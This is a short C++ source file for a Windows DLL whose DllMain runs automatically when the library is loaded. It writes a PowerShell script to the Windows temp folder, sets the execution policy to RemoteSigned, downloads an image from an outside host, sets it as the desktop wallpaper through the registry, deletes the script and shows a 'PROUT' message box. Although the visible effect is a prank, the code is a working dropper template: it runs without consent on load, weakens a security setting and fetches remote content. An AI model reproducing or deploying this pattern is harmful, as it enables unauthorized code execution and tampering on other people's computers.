/**
 * RUBEN WIHLER
 * 07.06.2023
*/

#include <iostream>
#include <fstream>
#include <windows.h>
#include <shellapi.h>
#include <string>

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "user32.lib")

using namespace std;

BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID LpReserved)
{
    if (dwReason != DLL_PROCESS_ATTACH) return TRUE;

    ofstream file;
    file.open("C:\\Windows\\Temp\\temp.ps1");

    string newArg = "-auto";
    string powershell;
    powershell = "Invoke-WebRequest -Uri https://t4.ftcdn.net/jpg/05/47/16/43/360_F_547164382_pgVeBKXSlnOjxL0zmNjprrMvjVayJTOW.jpg -OutFile $env:temp\\\\image.png;\n";
    powershell += "set-itemproperty -path \"HKCU:Control Panel\\Desktop\" -name WallPaper -value $env:temp\\\\image.png;\n";
    powershell += "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters;\n";
    powershell += "exit\n";
    file << powershell << endl;
    file.close();

    system("start powershell.exe Set-ExecutionPolicy RemoteSigned \n");
    system("start powershell.exe C:\\Windows\\Temp\\temp.ps1");
    system("cls");

    remove("C:\\Windows\\Temp\\temp.ps1");

    MessageBox(NULL, "PROUT", "", MB_OK | MB_ICONINFORMATION);

    return TRUE;
}